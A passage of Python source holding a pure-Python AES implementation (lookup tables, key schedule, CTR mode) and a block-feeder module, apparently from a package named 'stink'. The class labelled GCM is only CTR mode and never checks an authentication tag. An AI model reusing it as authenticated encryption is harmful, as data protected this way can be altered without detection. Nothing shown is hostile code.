        0x7DCE3AB4,
        0x6FD52DA9,
        0x61DC20A2,
        0xAD766DF6,
        0xA37F60FD,
        0xB16477E0,
        0xBF6D7AEB,
        0x955259DA,
        0x9B5B54D1,
        0x894043CC,
        0x87494EC7,
        0xDD3E05AE,
        0xD33708A5,
        0xC12C1FB8,
        0xCF2512B3,
        0xE51A3182,
        0xEB133C89,
        0xF9082B94,
        0xF701269F,
        0x4DE6BD46,
        0x43EFB04D,
        0x51F4A750,
        0x5FFDAA5B,
        0x75C2896A,
        0x7BCB8461,
        0x69D0937C,
        0x67D99E77,
        0x3DAED51E,
        0x33A7D815,
        0x21BCCF08,
        0x2FB5C203,
        0x058AE132,
        0x0B83EC39,
        0x1998FB24,
        0x1791F62F,
        0x764DD68D,
        0x7844DB86,
        0x6A5FCC9B,
        0x6456C190,
        0x4E69E2A1,
        0x4060EFAA,
        0x527BF8B7,
        0x5C72F5BC,
        0x0605BED5,
        0x080CB3DE,
        0x1A17A4C3,
        0x141EA9C8,
        0x3E218AF9,
        0x302887F2,
        0x223390EF,
        0x2C3A9DE4,
        0x96DD063D,
        0x98D40B36,
        0x8ACF1C2B,
        0x84C61120,
        0xAEF93211,
        0xA0F03F1A,
        0xB2EB2807,
        0xBCE2250C,
        0xE6956E65,
        0xE89C636E,
        0xFA877473,
        0xF48E7978,
        0xDEB15A49,
        0xD0B85742,
        0xC2A3405F,
        0xCCAA4D54,
        0x41ECDAF7,
        0x4FE5D7FC,
        0x5DFEC0E1,
        0x53F7CDEA,
        0x79C8EEDB,
        0x77C1E3D0,
        0x65DAF4CD,
        0x6BD3F9C6,
        0x31A4B2AF,
        0x3FADBFA4,
        0x2DB6A8B9,
        0x23BFA5B2,
        0x09808683,
        0x07898B88,
        0x15929C95,
        0x1B9B919E,
        0xA17C0A47,
        0xAF75074C,
        0xBD6E1051,
        0xB3671D5A,
        0x99583E6B,
        0x97513360,
        0x854A247D,
        0x8B432976,
        0xD134621F,
        0xDF3D6F14,
        0xCD267809,
        0xC32F7502,
        0xE9105633,
        0xE7195B38,
        0xF5024C25,
        0xFB0B412E,
        0x9AD7618C,
        0x94DE6C87,
        0x86C57B9A,
        0x88CC7691,
        0xA2F355A0,
        0xACFA58AB,
        0xBEE14FB6,
        0xB0E842BD,
        0xEA9F09D4,
        0xE49604DF,
        0xF68D13C2,
        0xF8841EC9,
        0xD2BB3DF8,
        0xDCB230F3,
        0xCEA927EE,
        0xC0A02AE5,
        0x7A47B13C,
        0x744EBC37,
        0x6655AB2A,
        0x685CA621,
        0x42638510,
        0x4C6A881B,
        0x5E719F06,
        0x5078920D,
        0x0A0FD964,
        0x0406D46F,
        0x161DC372,
        0x1814CE79,
        0x322BED48,
        0x3C22E043,
        0x2E39F75E,
        0x2030FA55,
        0xEC9AB701,
        0xE293BA0A,
        0xF088AD17,
        0xFE81A01C,
        0xD4BE832D,
        0xDAB78E26,
        0xC8AC993B,
        0xC6A59430,
        0x9CD2DF59,
        0x92DBD252,
        0x80C0C54F,
        0x8EC9C844,
        0xA4F6EB75,
        0xAAFFE67E,
        0xB8E4F163,
        0xB6EDFC68,
        0x0C0A67B1,
        0x02036ABA,
        0x10187DA7,
        0x1E1170AC,
        0x342E539D,
        0x3A275E96,
        0x283C498B,
        0x26354480,
        0x7C420FE9,
        0x724B02E2,
        0x605015FF,
        0x6E5918F4,
        0x44663BC5,
        0x4A6F36CE,
        0x587421D3,
        0x567D2CD8,
        0x37A10C7A,
        0x39A80171,
        0x2BB3166C,
        0x25BA1B67,
        0x0F853856,
        0x018C355D,
        0x13972240,
        0x1D9E2F4B,
        0x47E96422,
        0x49E06929,
        0x5BFB7E34,
        0x55F2733F,
        0x7FCD500E,
        0x71C45D05,
        0x63DF4A18,
        0x6DD64713,
        0xD731DCCA,
        0xD938D1C1,
        0xCB23C6DC,
        0xC52ACBD7,
        0xEF15E8E6,
        0xE11CE5ED,
        0xF307F2F0,
        0xFD0EFFFB,
        0xA779B492,
        0xA970B999,
        0xBB6BAE84,
        0xB562A38F,
        0x9F5D80BE,
        0x91548DB5,
        0x834F9AA8,
        0x8D4697A3,
    ]
    U2 = [
        0x00000000,
        0x0B0E090D,
        0x161C121A,
        0x1D121B17,
        0x2C382434,
        0x27362D39,
        0x3A24362E,
        0x312A3F23,
        0x58704868,
        0x537E4165,
        0x4E6C5A72,
        0x4562537F,
        0x74486C5C,
        0x7F466551,
        0x62547E46,
        0x695A774B,
        0xB0E090D0,
        0xBBEE99DD,
        0xA6FC82CA,
        0xADF28BC7,
        0x9CD8B4E4,
        0x97D6BDE9,
        0x8AC4A6FE,
        0x81CAAFF3,
        0xE890D8B8,
        0xE39ED1B5,
        0xFE8CCAA2,
        0xF582C3AF,
        0xC4A8FC8C,
        0xCFA6F581,
        0xD2B4EE96,
        0xD9BAE79B,
        0x7BDB3BBB,
        0x70D532B6,
        0x6DC729A1,
        0x66C920AC,
        0x57E31F8F,
        0x5CED1682,
        0x41FF0D95,
        0x4AF10498,
        0x23AB73D3,
        0x28A57ADE,
        0x35B761C9,
        0x3EB968C4,
        0x0F9357E7,
        0x049D5EEA,
        0x198F45FD,
        0x12814CF0,
        0xCB3BAB6B,
        0xC035A266,
        0xDD27B971,
        0xD629B07C,
        0xE7038F5F,
        0xEC0D8652,
        0xF11F9D45,
        0xFA119448,
        0x934BE303,
        0x9845EA0E,
        0x8557F119,
        0x8E59F814,
        0xBF73C737,
        0xB47DCE3A,
        0xA96FD52D,
        0xA261DC20,
        0xF6AD766D,
        0xFDA37F60,
        0xE0B16477,
        0xEBBF6D7A,
        0xDA955259,
        0xD19B5B54,
        0xCC894043,
        0xC787494E,
        0xAEDD3E05,
        0xA5D33708,
        0xB8C12C1F,
        0xB3CF2512,
        0x82E51A31,
        0x89EB133C,
        0x94F9082B,
        0x9FF70126,
        0x464DE6BD,
        0x4D43EFB0,
        0x5051F4A7,
        0x5B5FFDAA,
        0x6A75C289,
        0x617BCB84,
        0x7C69D093,
        0x7767D99E,
        0x1E3DAED5,
        0x1533A7D8,
        0x0821BCCF,
        0x032FB5C2,
        0x32058AE1,
        0x390B83EC,
        0x241998FB,
        0x2F1791F6,
        0x8D764DD6,
        0x867844DB,
        0x9B6A5FCC,
        0x906456C1,
        0xA14E69E2,
        0xAA4060EF,
        0xB7527BF8,
        0xBC5C72F5,
        0xD50605BE,
        0xDE080CB3,
        0xC31A17A4,
        0xC8141EA9,
        0xF93E218A,
        0xF2302887,
        0xEF223390,
        0xE42C3A9D,
        0x3D96DD06,
        0x3698D40B,
        0x2B8ACF1C,
        0x2084C611,
        0x11AEF932,
        0x1AA0F03F,
        0x07B2EB28,
        0x0CBCE225,
        0x65E6956E,
        0x6EE89C63,
        0x73FA8774,
        0x78F48E79,
        0x49DEB15A,
        0x42D0B857,
        0x5FC2A340,
        0x54CCAA4D,
        0xF741ECDA,
        0xFC4FE5D7,
        0xE15DFEC0,
        0xEA53F7CD,
        0xDB79C8EE,
        0xD077C1E3,
        0xCD65DAF4,
        0xC66BD3F9,
        0xAF31A4B2,
        0xA43FADBF,
        0xB92DB6A8,
        0xB223BFA5,
        0x83098086,
        0x8807898B,
        0x9515929C,
        0x9E1B9B91,
        0x47A17C0A,
        0x4CAF7507,
        0x51BD6E10,
        0x5AB3671D,
        0x6B99583E,
        0x60975133,
        0x7D854A24,
        0x768B4329,
        0x1FD13462,
        0x14DF3D6F,
        0x09CD2678,
        0x02C32F75,
        0x33E91056,
        0x38E7195B,
        0x25F5024C,
        0x2EFB0B41,
        0x8C9AD761,
        0x8794DE6C,
        0x9A86C57B,
        0x9188CC76,
        0xA0A2F355,
        0xABACFA58,
        0xB6BEE14F,
        0xBDB0E842,
        0xD4EA9F09,
        0xDFE49604,
        0xC2F68D13,
        0xC9F8841E,
        0xF8D2BB3D,
        0xF3DCB230,
        0xEECEA927,
        0xE5C0A02A,
        0x3C7A47B1,
        0x37744EBC,
        0x2A6655AB,
        0x21685CA6,
        0x10426385,
        0x1B4C6A88,
        0x065E719F,
        0x0D507892,
        0x640A0FD9,
        0x6F0406D4,
        0x72161DC3,
        0x791814CE,
        0x48322BED,
        0x433C22E0,
        0x5E2E39F7,
        0x552030FA,
        0x01EC9AB7,
        0x0AE293BA,
        0x17F088AD,
        0x1CFE81A0,
        0x2DD4BE83,
        0x26DAB78E,
        0x3BC8AC99,
        0x30C6A594,
        0x599CD2DF,
        0x5292DBD2,
        0x4F80C0C5,
        0x448EC9C8,
        0x75A4F6EB,
        0x7EAAFFE6,
        0x63B8E4F1,
        0x68B6EDFC,
        0xB10C0A67,
        0xBA02036A,
        0xA710187D,
        0xAC1E1170,
        0x9D342E53,
        0x963A275E,
        0x8B283C49,
        0x80263544,
        0xE97C420F,
        0xE2724B02,
        0xFF605015,
        0xF46E5918,
        0xC544663B,
        0xCE4A6F36,
        0xD3587421,
        0xD8567D2C,
        0x7A37A10C,
        0x7139A801,
        0x6C2BB316,
        0x6725BA1B,
        0x560F8538,
        0x5D018C35,
        0x40139722,
        0x4B1D9E2F,
        0x2247E964,
        0x2949E069,
        0x345BFB7E,
        0x3F55F273,
        0x0E7FCD50,
        0x0571C45D,
        0x1863DF4A,
        0x136DD647,
        0xCAD731DC,
        0xC1D938D1,
        0xDCCB23C6,
        0xD7C52ACB,
        0xE6EF15E8,
        0xEDE11CE5,
        0xF0F307F2,
        0xFBFD0EFF,
        0x92A779B4,
        0x99A970B9,
        0x84BB6BAE,
        0x8FB562A3,
        0xBE9F5D80,
        0xB591548D,
        0xA8834F9A,
        0xA38D4697,
    ]
    U3 = [
        0x00000000,
        0x0D0B0E09,
        0x1A161C12,
        0x171D121B,
        0x342C3824,
        0x3927362D,
        0x2E3A2436,
        0x23312A3F,
        0x68587048,
        0x65537E41,
        0x724E6C5A,
        0x7F456253,
        0x5C74486C,
        0x517F4665,
        0x4662547E,
        0x4B695A77,
        0xD0B0E090,
        0xDDBBEE99,
        0xCAA6FC82,
        0xC7ADF28B,
        0xE49CD8B4,
        0xE997D6BD,
        0xFE8AC4A6,
        0xF381CAAF,
        0xB8E890D8,
        0xB5E39ED1,
        0xA2FE8CCA,
        0xAFF582C3,
        0x8CC4A8FC,
        0x81CFA6F5,
        0x96D2B4EE,
        0x9BD9BAE7,
        0xBB7BDB3B,
        0xB670D532,
        0xA16DC729,
        0xAC66C920,
        0x8F57E31F,
        0x825CED16,
        0x9541FF0D,
        0x984AF104,
        0xD323AB73,
        0xDE28A57A,
        0xC935B761,
        0xC43EB968,
        0xE70F9357,
        0xEA049D5E,
        0xFD198F45,
        0xF012814C,
        0x6BCB3BAB,
        0x66C035A2,
        0x71DD27B9,
        0x7CD629B0,
        0x5FE7038F,
        0x52EC0D86,
        0x45F11F9D,
        0x48FA1194,
        0x03934BE3,
        0x0E9845EA,
        0x198557F1,
        0x148E59F8,
        0x37BF73C7,
        0x3AB47DCE,
        0x2DA96FD5,
        0x20A261DC,
        0x6DF6AD76,
        0x60FDA37F,
        0x77E0B164,
        0x7AEBBF6D,
        0x59DA9552,
        0x54D19B5B,
        0x43CC8940,
        0x4EC78749,
        0x05AEDD3E,
        0x08A5D337,
        0x1FB8C12C,
        0x12B3CF25,
        0x3182E51A,
        0x3C89EB13,
        0x2B94F908,
        0x269FF701,
        0xBD464DE6,
        0xB04D43EF,
        0xA75051F4,
        0xAA5B5FFD,
        0x896A75C2,
        0x84617BCB,
        0x937C69D0,
        0x9E7767D9,
        0xD51E3DAE,
        0xD81533A7,
        0xCF0821BC,
        0xC2032FB5,
        0xE132058A,
        0xEC390B83,
        0xFB241998,
        0xF62F1791,
        0xD68D764D,
        0xDB867844,
        0xCC9B6A5F,
        0xC1906456,
        0xE2A14E69,
        0xEFAA4060,
        0xF8B7527B,
        0xF5BC5C72,
        0xBED50605,
        0xB3DE080C,
        0xA4C31A17,
        0xA9C8141E,
        0x8AF93E21,
        0x87F23028,
        0x90EF2233,
        0x9DE42C3A,
        0x063D96DD,
        0x0B3698D4,
        0x1C2B8ACF,
        0x112084C6,
        0x3211AEF9,
        0x3F1AA0F0,
        0x2807B2EB,
        0x250CBCE2,
        0x6E65E695,
        0x636EE89C,
        0x7473FA87,
        0x7978F48E,
        0x5A49DEB1,
        0x5742D0B8,
        0x405FC2A3,
        0x4D54CCAA,
        0xDAF741EC,
        0xD7FC4FE5,
        0xC0E15DFE,
        0xCDEA53F7,
        0xEEDB79C8,
        0xE3D077C1,
        0xF4CD65DA,
        0xF9C66BD3,
        0xB2AF31A4,
        0xBFA43FAD,
        0xA8B92DB6,
        0xA5B223BF,
        0x86830980,
        0x8B880789,
        0x9C951592,
        0x919E1B9B,
        0x0A47A17C,
        0x074CAF75,
        0x1051BD6E,
        0x1D5AB367,
        0x3E6B9958,
        0x33609751,
        0x247D854A,
        0x29768B43,
        0x621FD134,
        0x6F14DF3D,
        0x7809CD26,
        0x7502C32F,
        0x5633E910,
        0x5B38E719,
        0x4C25F502,
        0x412EFB0B,
        0x618C9AD7,
        0x6C8794DE,
        0x7B9A86C5,
        0x769188CC,
        0x55A0A2F3,
        0x58ABACFA,
        0x4FB6BEE1,
        0x42BDB0E8,
        0x09D4EA9F,
        0x04DFE496,
        0x13C2F68D,
        0x1EC9F884,
        0x3DF8D2BB,
        0x30F3DCB2,
        0x27EECEA9,
        0x2AE5C0A0,
        0xB13C7A47,
        0xBC37744E,
        0xAB2A6655,
        0xA621685C,
        0x85104263,
        0x881B4C6A,
        0x9F065E71,
        0x920D5078,
        0xD9640A0F,
        0xD46F0406,
        0xC372161D,
        0xCE791814,
        0xED48322B,
        0xE0433C22,
        0xF75E2E39,
        0xFA552030,
        0xB701EC9A,
        0xBA0AE293,
        0xAD17F088,
        0xA01CFE81,
        0x832DD4BE,
        0x8E26DAB7,
        0x993BC8AC,
        0x9430C6A5,
        0xDF599CD2,
        0xD25292DB,
        0xC54F80C0,
        0xC8448EC9,
        0xEB75A4F6,
        0xE67EAAFF,
        0xF163B8E4,
        0xFC68B6ED,
        0x67B10C0A,
        0x6ABA0203,
        0x7DA71018,
        0x70AC1E11,
        0x539D342E,
        0x5E963A27,
        0x498B283C,
        0x44802635,
        0x0FE97C42,
        0x02E2724B,
        0x15FF6050,
        0x18F46E59,
        0x3BC54466,
        0x36CE4A6F,
        0x21D35874,
        0x2CD8567D,
        0x0C7A37A1,
        0x017139A8,
        0x166C2BB3,
        0x1B6725BA,
        0x38560F85,
        0x355D018C,
        0x22401397,
        0x2F4B1D9E,
        0x642247E9,
        0x692949E0,
        0x7E345BFB,
        0x733F55F2,
        0x500E7FCD,
        0x5D0571C4,
        0x4A1863DF,
        0x47136DD6,
        0xDCCAD731,
        0xD1C1D938,
        0xC6DCCB23,
        0xCBD7C52A,
        0xE8E6EF15,
        0xE5EDE11C,
        0xF2F0F307,
        0xFFFBFD0E,
        0xB492A779,
        0xB999A970,
        0xAE84BB6B,
        0xA38FB562,
        0x80BE9F5D,
        0x8DB59154,
        0x9AA8834F,
        0x97A38D46,
    ]
    U4 = [
        0x00000000,
        0x090D0B0E,
        0x121A161C,
        0x1B171D12,
        0x24342C38,
        0x2D392736,
        0x362E3A24,
        0x3F23312A,
        0x48685870,
        0x4165537E,
        0x5A724E6C,
        0x537F4562,
        0x6C5C7448,
        0x65517F46,
        0x7E466254,
        0x774B695A,
        0x90D0B0E0,
        0x99DDBBEE,
        0x82CAA6FC,
        0x8BC7ADF2,
        0xB4E49CD8,
        0xBDE997D6,
        0xA6FE8AC4,
        0xAFF381CA,
        0xD8B8E890,
        0xD1B5E39E,
        0xCAA2FE8C,
        0xC3AFF582,
        0xFC8CC4A8,
        0xF581CFA6,
        0xEE96D2B4,
        0xE79BD9BA,
        0x3BBB7BDB,
        0x32B670D5,
        0x29A16DC7,
        0x20AC66C9,
        0x1F8F57E3,
        0x16825CED,
        0x0D9541FF,
        0x04984AF1,
        0x73D323AB,
        0x7ADE28A5,
        0x61C935B7,
        0x68C43EB9,
        0x57E70F93,
        0x5EEA049D,
        0x45FD198F,
        0x4CF01281,
        0xAB6BCB3B,
        0xA266C035,
        0xB971DD27,
        0xB07CD629,
        0x8F5FE703,
        0x8652EC0D,
        0x9D45F11F,
        0x9448FA11,
        0xE303934B,
        0xEA0E9845,
        0xF1198557,
        0xF8148E59,
        0xC737BF73,
        0xCE3AB47D,
        0xD52DA96F,
        0xDC20A261,
        0x766DF6AD,
        0x7F60FDA3,
        0x6477E0B1,
        0x6D7AEBBF,
        0x5259DA95,
        0x5B54D19B,
        0x4043CC89,
        0x494EC787,
        0x3E05AEDD,
        0x3708A5D3,
        0x2C1FB8C1,
        0x2512B3CF,
        0x1A3182E5,
        0x133C89EB,
        0x082B94F9,
        0x01269FF7,
        0xE6BD464D,
        0xEFB04D43,
        0xF4A75051,
        0xFDAA5B5F,
        0xC2896A75,
        0xCB84617B,
        0xD0937C69,
        0xD99E7767,
        0xAED51E3D,
        0xA7D81533,
        0xBCCF0821,
        0xB5C2032F,
        0x8AE13205,
        0x83EC390B,
        0x98FB2419,
        0x91F62F17,
        0x4DD68D76,
        0x44DB8678,
        0x5FCC9B6A,
        0x56C19064,
        0x69E2A14E,
        0x60EFAA40,
        0x7BF8B752,
        0x72F5BC5C,
        0x05BED506,
        0x0CB3DE08,
        0x17A4C31A,
        0x1EA9C814,
        0x218AF93E,
        0x2887F230,
        0x3390EF22,
        0x3A9DE42C,
        0xDD063D96,
        0xD40B3698,
        0xCF1C2B8A,
        0xC6112084,
        0xF93211AE,
        0xF03F1AA0,
        0xEB2807B2,
        0xE2250CBC,
        0x956E65E6,
        0x9C636EE8,
        0x877473FA,
        0x8E7978F4,
        0xB15A49DE,
        0xB85742D0,
        0xA3405FC2,
        0xAA4D54CC,
        0xECDAF741,
        0xE5D7FC4F,
        0xFEC0E15D,
        0xF7CDEA53,
        0xC8EEDB79,
        0xC1E3D077,
        0xDAF4CD65,
        0xD3F9C66B,
        0xA4B2AF31,
        0xADBFA43F,
        0xB6A8B92D,
        0xBFA5B223,
        0x80868309,
        0x898B8807,
        0x929C9515,
        0x9B919E1B,
        0x7C0A47A1,
        0x75074CAF,
        0x6E1051BD,
        0x671D5AB3,
        0x583E6B99,
        0x51336097,
        0x4A247D85,
        0x4329768B,
        0x34621FD1,
        0x3D6F14DF,
        0x267809CD,
        0x2F7502C3,
        0x105633E9,
        0x195B38E7,
        0x024C25F5,
        0x0B412EFB,
        0xD7618C9A,
        0xDE6C8794,
        0xC57B9A86,
        0xCC769188,
        0xF355A0A2,
        0xFA58ABAC,
        0xE14FB6BE,
        0xE842BDB0,
        0x9F09D4EA,
        0x9604DFE4,
        0x8D13C2F6,
        0x841EC9F8,
        0xBB3DF8D2,
        0xB230F3DC,
        0xA927EECE,
        0xA02AE5C0,
        0x47B13C7A,
        0x4EBC3774,
        0x55AB2A66,
        0x5CA62168,
        0x63851042,
        0x6A881B4C,
        0x719F065E,
        0x78920D50,
        0x0FD9640A,
        0x06D46F04,
        0x1DC37216,
        0x14CE7918,
        0x2BED4832,
        0x22E0433C,
        0x39F75E2E,
        0x30FA5520,
        0x9AB701EC,
        0x93BA0AE2,
        0x88AD17F0,
        0x81A01CFE,
        0xBE832DD4,
        0xB78E26DA,
        0xAC993BC8,
        0xA59430C6,
        0xD2DF599C,
        0xDBD25292,
        0xC0C54F80,
        0xC9C8448E,
        0xF6EB75A4,
        0xFFE67EAA,
        0xE4F163B8,
        0xEDFC68B6,
        0x0A67B10C,
        0x036ABA02,
        0x187DA710,
        0x1170AC1E,
        0x2E539D34,
        0x275E963A,
        0x3C498B28,
        0x35448026,
        0x420FE97C,
        0x4B02E272,
        0x5015FF60,
        0x5918F46E,
        0x663BC544,
        0x6F36CE4A,
        0x7421D358,
        0x7D2CD856,
        0xA10C7A37,
        0xA8017139,
        0xB3166C2B,
        0xBA1B6725,
        0x8538560F,
        0x8C355D01,
        0x97224013,
        0x9E2F4B1D,
        0xE9642247,
        0xE0692949,
        0xFB7E345B,
        0xF2733F55,
        0xCD500E7F,
        0xC45D0571,
        0xDF4A1863,
        0xD647136D,
        0x31DCCAD7,
        0x38D1C1D9,
        0x23C6DCCB,
        0x2ACBD7C5,
        0x15E8E6EF,
        0x1CE5EDE1,
        0x07F2F0F3,
        0x0EFFFBFD,
        0x79B492A7,
        0x70B999A9,
        0x6BAE84BB,
        0x62A38FB5,
        0x5D80BE9F,
        0x548DB591,
        0x4F9AA883,
        0x4697A38D,
    ]

    def __init__(self, key):

        if len(key) not in (16, 24, 32):
            raise ValueError("Invalid key size")

        rounds = self.number_of_rounds[len(key)]

        self._Ke = [[0] * 4 for i in xrange(rounds + 1)]
        self._Kd = [[0] * 4 for i in xrange(rounds + 1)]

        round_key_count = (rounds + 1) * 4
        KC = len(key) // 4

        tk = [struct.unpack(">i", key[i : i + 4])[0] for i in xrange(0, len(key), 4)]

        for i in xrange(0, KC):
            self._Ke[i // 4][i % 4] = tk[i]
            self._Kd[rounds - (i // 4)][i % 4] = tk[i]

        rconpointer = 0
        t = KC
        while t < round_key_count:

            tt = tk[KC - 1]
            tk[0] ^= (
                (self.S[(tt >> 16) & 0xFF] << 24)
                ^ (self.S[(tt >> 8) & 0xFF] << 16)
                ^ (self.S[tt & 0xFF] << 8)
                ^ self.S[(tt >> 24) & 0xFF]
                ^ (self.rcon[rconpointer] << 24)
            )
            rconpointer += 1

            if KC != 8:
                for i in xrange(1, KC):
                    tk[i] ^= tk[i - 1]

            else:
                for i in xrange(1, KC // 2):
                    tk[i] ^= tk[i - 1]
                tt = tk[KC // 2 - 1]

                tk[KC // 2] ^= (
                    self.S[tt & 0xFF]
                    ^ (self.S[(tt >> 8) & 0xFF] << 8)
                    ^ (self.S[(tt >> 16) & 0xFF] << 16)
                    ^ (self.S[(tt >> 24) & 0xFF] << 24)
                )

                for i in xrange(KC // 2 + 1, KC):
                    tk[i] ^= tk[i - 1]

            j = 0
            while j < KC and t < round_key_count:
                self._Ke[t // 4][t % 4] = tk[j]
                self._Kd[rounds - (t // 4)][t % 4] = tk[j]
                j += 1
                t += 1

        for r in xrange(1, rounds):
            for j in xrange(0, 4):
                tt = self._Kd[r][j]
                self._Kd[r][j] = (
                    self.U1[(tt >> 24) & 0xFF]
                    ^ self.U2[(tt >> 16) & 0xFF]
                    ^ self.U3[(tt >> 8) & 0xFF]
                    ^ self.U4[tt & 0xFF]
                )

    def encrypt(self, plaintext):

        if len(plaintext) != 16:
            raise ValueError("wrong block length")

        rounds = len(self._Ke) - 1
        (s1, s2, s3) = [1, 2, 3]
        a = [0, 0, 0, 0]

        t = [
            (_compact_word(plaintext[4 * i : 4 * i + 4]) ^ self._Ke[0][i])
            for i in xrange(0, 4)
        ]

        for r in xrange(1, rounds):
            for i in xrange(0, 4):
                a[i] = (
                    self.T1[(t[i] >> 24) & 0xFF]
                    ^ self.T2[(t[(i + s1) % 4] >> 16) & 0xFF]
                    ^ self.T3[(t[(i + s2) % 4] >> 8) & 0xFF]
                    ^ self.T4[t[(i + s3) % 4] & 0xFF]
                    ^ self._Ke[r][i]
                )
            t = copy.copy(a)

        result = []
        for i in xrange(0, 4):
            tt = self._Ke[rounds][i]
            result.append((self.S[(t[i] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
            result.append((self.S[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
            result.append((self.S[(t[(i + s2) % 4] >> 8) & 0xFF] ^ (tt >> 8)) & 0xFF)
            result.append((self.S[t[(i + s3) % 4] & 0xFF] ^ tt) & 0xFF)

        return result

    def decrypt(self, ciphertext):

        if len(ciphertext) != 16:
            raise ValueError("wrong block length")

        rounds = len(self._Kd) - 1
        (s1, s2, s3) = [3, 2, 1]
        a = [0, 0, 0, 0]

        t = [
            (_compact_word(ciphertext[4 * i : 4 * i + 4]) ^ self._Kd[0][i])
            for i in xrange(0, 4)
        ]

        for r in xrange(1, rounds):
            for i in xrange(0, 4):
                a[i] = (
                    self.T5[(t[i] >> 24) & 0xFF]
                    ^ self.T6[(t[(i + s1) % 4] >> 16) & 0xFF]
                    ^ self.T7[(t[(i + s2) % 4] >> 8) & 0xFF]
                    ^ self.T8[t[(i + s3) % 4] & 0xFF]
                    ^ self._Kd[r][i]
                )
            t = copy.copy(a)

        result = []
        for i in xrange(0, 4):
            tt = self._Kd[rounds][i]
            result.append((self.Si[(t[i] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
            result.append((self.Si[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
            result.append((self.Si[(t[(i + s2) % 4] >> 8) & 0xFF] ^ (tt >> 8)) & 0xFF)
            result.append((self.Si[t[(i + s3) % 4] & 0xFF] ^ tt) & 0xFF)

        return result


class Counter(object):

    def __init__(self, initial_value=1):

        self._counter = [((initial_value >> i) % 256) for i in xrange(128 - 8, -1, -8)]

    value = property(lambda s: s._counter)

    def increment(self):

        for i in xrange(len(self._counter) - 1, -1, -1):
            self._counter[i] += 1

            if self._counter[i] < 256:
                break

            # Carry the one
            self._counter[i] = 0

        # Overflow
        else:
            self._counter = [0] * len(self._counter)


class AESBlockModeOfOperation(object):

    def __init__(self, key):
        self._aes = AES(key)

    def decrypt(self, ciphertext):
        raise Exception("not implemented")

    def encrypt(self, plaintext):
        raise Exception("not implemented")


class AESStreamModeOfOperation(AESBlockModeOfOperation): ...


class AESSegmentModeOfOperation(AESStreamModeOfOperation):

    segment_bytes = 16


class AESModeOfOperationCTR(AESStreamModeOfOperation):

    name = "Counter (CTR)"

    def __init__(self, key, counter=None):
        AESBlockModeOfOperation.__init__(self, key)

        if counter is None:
            counter = Counter()

        self._counter = counter
        self._remaining_counter = []

    def encrypt(self, plaintext):
        while len(self._remaining_counter) < len(plaintext):
            self._remaining_counter += self._aes.encrypt(self._counter.value)
            self._counter.increment()

        plaintext = _string_to_bytes(plaintext)

        encrypted = [(p ^ c) for (p, c) in zip(plaintext, self._remaining_counter)]
        self._remaining_counter = self._remaining_counter[len(encrypted) :]

        return _bytes_to_string(encrypted)

    def decrypt(self, crypttext):
        return self.encrypt(crypttext)


class AESModeOfOperationGCM(AESModeOfOperationCTR):
    name = "GCM"

    def __init__(self, key, iv):
        iv = iv + b"\x00\x00\x00\x02"
        iv_int = 0
        for i in xrange(0, len(iv), 4):
            iv_int = (iv_int << 32) + struct.unpack(">I", iv[i : i + 4])[0]
        AESModeOfOperationCTR.__init__(self, key, counter=Counter(iv_int))


AESModesOfOperation = dict(
    ctr=AESModeOfOperationCTR,
    gcm=AESModeOfOperationGCM,
)


# Content from stink/stink/helpers/cipher/blockfeeder.py
from stink.helpers.cipher.aes import (
    AESBlockModeOfOperation,
    AESSegmentModeOfOperation,
    AESStreamModeOfOperation,
)
from stink.helpers.cipher.utils import (
    append_PKCS7_padding,
    strip_PKCS7_padding,
    to_bufferable,
)

PADDING_NONE = "none"
PADDING_DEFAULT = "default"


def _block_can_consume(self, size):
    if size >= 16:
        return 16
    return 0


def _block_final_encrypt(self, data, padding=PADDING_DEFAULT):
    if padding == PADDING_DEFAULT:
        data = append_PKCS7_padding(data)

    elif padding == PADDING_NONE:
        if len(data) != 16:
            raise Exception("invalid data length for final block")
    else:
        raise Exception("invalid padding option")

    if len(data) == 32:
        return self.encrypt(data[:16]) + self.encrypt(data[16:])

    return self.encrypt(data)


def _block_final_decrypt(self, data, padding=PADDING_DEFAULT):
    if padding == PADDING_DEFAULT:
        return strip_PKCS7_padding(self.decrypt(data))

    if padding == PADDING_NONE:
        if len(data) != 16:
            raise Exception("invalid data length for final block")
        return self.decrypt(data)

    raise Exception("invalid padding option")


AESBlockModeOfOperation._can_consume = _block_can_consume
AESBlockModeOfOperation._final_encrypt = _block_final_encrypt
AESBlockModeOfOperation._final_decrypt = _block_final_decrypt


def _segment_can_consume(self, size):
    return self.segment_bytes * int(size // self.segment_bytes)


def _segment_final_encrypt(self, data, padding=PADDING_DEFAULT):
    if padding != PADDING_DEFAULT:
        raise Exception("invalid padding option")

    faux_padding = chr(0) * (self.segment_bytes - (len(data) % self.segment_bytes))
    padded = data + to_bufferable(faux_padding)
    return self.encrypt(padded)[: len(data)]


def _segment_final_decrypt(self, data, padding=PADDING_DEFAULT):
    if padding != PADDING_DEFAULT:
        raise Exception("invalid padding option")

    faux_padding = chr(0) * (self.segment_bytes - (len(data) % self.segment_bytes))
    padded = data + to_bufferable(faux_padding)
    return self.decrypt(padded)[: len(data)]


AESSegmentModeOfOperation._can_consume = _segment_can_consume
AESSegmentModeOfOperation._final_encrypt = _segment_final_encrypt
AESSegmentModeOfOperation._final_decrypt = _segment_final_decrypt


def _stream_can_consume(self, size):
    return size


def _stream_final_encrypt(self, data, padding=PADDING_DEFAULT):
    if padding not in [PADDING_NONE, PADDING_DEFAULT]:
        raise Exception("invalid padding option")

    return self.encrypt(data)


def _stream_final_decrypt(self, data, padding=PADDING_DEFAULT):
    if padding not in [PADDING_NONE, PADDING_DEFAULT]:
        raise Exception("invalid padding option")

    return self.decrypt(data)


AESStreamModeOfOperation._can_consume = _stream_can_consume
AESStreamModeOfOperation._final_encrypt = _stream_final_encrypt
AESStreamModeOfOperation._final_decrypt = _stream_final_decrypt


class BlockFeeder(object):

    def __init__(self, mode, feed, final, padding=PADDING_DEFAULT):
        self._mode = mode
        self._feed = feed
        self._final = final
        self._buffer = to_bufferable("")
        self._padding = padding

    def feed(self, data=None):

        if self._buffer is None:
            raise ValueError("already finished feeder")

        # Finalize; process the spare bytes we were keeping
        if data is None:
            result = self._final(self._buffer, self._padding)
            self._buffer = None
            return result

        self._buffer += to_bufferable(data)

        result = to_bufferable("")
        while len(self._buffer) > 16:
            can_consume = self._mode._can_consume(len(self._buffer) - 16)
            if can_consume == 0:
                break
